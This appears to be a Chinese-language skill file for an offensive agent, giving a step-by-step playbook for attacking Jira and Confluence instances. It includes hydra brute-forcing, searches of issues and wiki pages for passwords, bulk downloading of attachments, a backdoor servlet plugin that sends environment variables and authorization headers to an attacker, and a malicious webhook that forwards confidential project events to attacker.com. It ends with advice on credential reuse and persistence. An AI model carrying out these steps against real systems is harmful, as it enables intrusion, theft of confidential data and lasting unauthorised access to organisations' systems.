---
name: jira-attack
type: attack
category: issue-tracking
platform: jira
severity: medium
---

# Jira 攻击技能

## 触发条件

- 发现 Jira 实例
- 有 Jira 凭证
- 用户要求"攻击 Jira"

## 前置检查

```bash
# 1. 测试连接
curl -u user:password https://jira.example.com/rest/api/2/serverInfo

# 2. 检查版本
curl -u user:password https://jira.example.com/rest/api/2/serverInfo | jq '.versionNumbers'
```

## 攻击方法

### 方法 1: 凭证破解

```bash
# 1. 枚举用户
curl -u user:password https://jira.example.com/rest/api/2/users/search

# 2. 暴力破解
hydra -L users.txt -P passwords.txt jira.example.com https-get-certificates-sni 443

# 3. 测试默认密码
# admin/admin, jira/jira, etc.
```

### 方法 2: Issue 敏感信息窃取

```bash
# 1. 列出所有 projects
curl -u user:password https://jira.example.com/rest/api/2/project | jq -r '.[].key'

# 2. 搜索敏感 issue
curl -u user:password \
  "https://jira.example.com/rest/api/2/search?jql=text%20~%20%22password%22%20OR%20%22secret%22" \
  | jq -r '.issues[].key'
```

### 方法 3: 附件下载

```bash
# 1. 从 issue 获取附件
curl -u user:password \
  "https://jira.example.com/rest/api/2/issue/ISSUE-KEY?fields=attachment" \
  | jq -r '.fields.attachment[].filename'

# 2. 下载附件
curl -u user:password \
  "https://jira.example.com/secure/attachment/ATTACHMENT_ID/"
```

### 方法 4: Confluence 窃取

```bash
# 1. 列出所有空间
curl -u user:password \
  "https://jira.example.com/wiki/rest/api/space?limit=1000"

# 2. 搜索敏感页面
curl -u user:password \
  "https://jira.example.com/wiki/rest/api/search?cql=site.search%20~%20%22password%22" \
  | jq -r '.results[].title'
```

### 方法 5: Jira Plugin 后门

```bash
# 1. 创建恶意插件
# 需要开发者账户和插件上传权限

# 2. 插件后门代码
cat > JiraBackdoor.java <<'EOF'
public class JiraBackdoor extends HttpServlet {
  protected void doGet(HttpServletRequest request, HttpServletResponse response) {
    // 窃取所有环境变量和请求头
    String exfil = System.getenv() + request.getHeader("Authorization");
    sendToAttacker(exfil);
  }
}
EOF

# 3. 编译并打包插件
mvn package
```

### 方法 6. Webhook 滥用

```bash
# 1. 列出 webhooks
curl -u admin:password \
  "https://jira.example.com/rest/api/2/webhook" | jq '.'

# 2. 创建恶意 webhook
curl -X POST \
  -u admin:password \
  -H "Content-Type: application/json" \
  -d '{
    "name": "exfil-webhook",
    "url": "https://attacker.com/jira-webhook",
    "events": ["issue_created", "issue_updated"],
    "jql_filter": "project = CONFIDENTIAL"
  }' \
  https://jira.example.com/rest/api/2/webhook
```

## 验证成功

```bash
# 成功获取 issue
curl -u user:password https://jira.example.com/rest/api/2/issue/CONFIDENTIAL-1

# 成功下载附件
ls -lh downloaded_attachment

# 成功窃取信息
curl https://attacker.com/jira-data
```

## 下一步

1. 分析窃取的 issue 和附件
2. 使用窃取的凭证访问其他系统
3. 通过 Jira 持久化
